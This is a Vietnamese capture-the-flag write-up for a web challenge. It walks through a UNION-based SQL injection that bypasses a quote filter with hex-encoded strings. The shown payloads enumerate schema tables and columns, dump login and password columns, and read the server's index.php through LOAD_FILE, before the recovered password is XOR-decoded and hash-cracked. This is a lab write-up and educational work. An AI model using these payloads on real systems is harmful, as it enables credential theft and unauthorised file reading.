![image](https://user-images.githubusercontent.com/125866921/232450893-1f68b89f-c5f1-4c9f-9b45-6afb5bf5803e.png)

  - Ở challenge này các kí tự như ``'``, ``"`` tiếp tục bị filter.  
  - Đầu tiên ta kiểm tra xem sẽ có bao nhiêu cột bằng câu lệnh sau: ``order by`` và tăng dần giá trị và khi lên đến 5 thì xuất hiện lỗi, do đó chỉ có 4 cột.  

![image](https://user-images.githubusercontent.com/125866921/232451932-2ec71394-a3ad-4b74-afa1-84d4ba211d65.png)

  - Tiếp theo ta sử dụng ``union select 1,2,3,4 --``. Thì thấy rằng cột thứ 3 đã bị ẩn đi, nên ta sẽ khai thác SQLi trên các cột khác.  
  - Ở đây mình sẽ khai thác ở cột 4 do trả về email dưới dạng chuỗi.  

![image](https://user-images.githubusercontent.com/125866921/232452854-d1a187f3-2510-48e3-ad14-c88f24584d30.png)

  - Sau khi sử dụng câu truy vấn sau: ``union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()--``. Ta thấy có 1 bảng ``member`` xuất hiện.  
  - Ta thực hiện lấy ``column_name`` từ bảng ``member`` với ``member`` được mã hóa sang hex. Ta sẽ được payload sau: ``union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6d656d626572--``.  

![image](https://user-images.githubusercontent.com/125866921/232453372-3ccb12da-f11a-4eb6-bb15-771329a6d6d4.png)

  - Tại phần email xuất hiện 4 column, nhưng ta chỉ cần để ý đến ``member_login`` và ``member_password``.  
  - Tiếp tục khai thác 2 column đó bằng payload sau: ``union select 1,2,3,group_concat(member_login,member_password) FROM member--``.  

![image](https://user-images.githubusercontent.com/125866921/232454876-76026238-896a-4e34-95fa-8e9dc78729e6.png)

  - Đến đây đã xuất hiện ``member_login`` và ``member_password``.  
  - Nhìn sơ  qua phần password có lẽ là base64 nhưng khi decode ra thì không thu được gì cả.  
  - Do đó ta phải xem phần source code của challenge này.  

![image](https://user-images.githubusercontent.com/125866921/232456044-627aa6e2-0547-442d-acf5-aec81c2fff0b.png)

  - Với payload sau: ``union select 1,2,3,LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870)--``, thì ta đã xem được phần source code của web này.  

      - Với ``2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870`` là encode từ hex của ``/challenge/web-serveur/ch31/index.php``.  
      - ``LOAD_FILE()`` là hàm được sử dụng để đọc và trả về nội dung của một tập tin.  

  - Sau khi đọc phần source code, mình sẽ tiến hành XOR cái ``member_password`` lúc nãy với ``key`` ở phần source.  

![image](https://user-images.githubusercontent.com/125866921/232457590-f2fe17bc-4234-4e2f-ae0a-b31958f5ebca.png)

  - Sau khi XOR thì nó xuất hiện 1 chuỗi ``77be4fc97f77f5f48308942bb6e32aacabed9cef``.  
  - Ta sử dụng tool ``Cipher Identifier`` của dcode để xem đây là loại mã gì.  

![image](https://user-images.githubusercontent.com/125866921/232458141-83b735db-c63e-42c5-a22f-a96d0b7e0680.png)

  - Sau khi biết nó là ``SHA-1`` thì decode ra và nhận được flag là ``superpassword``
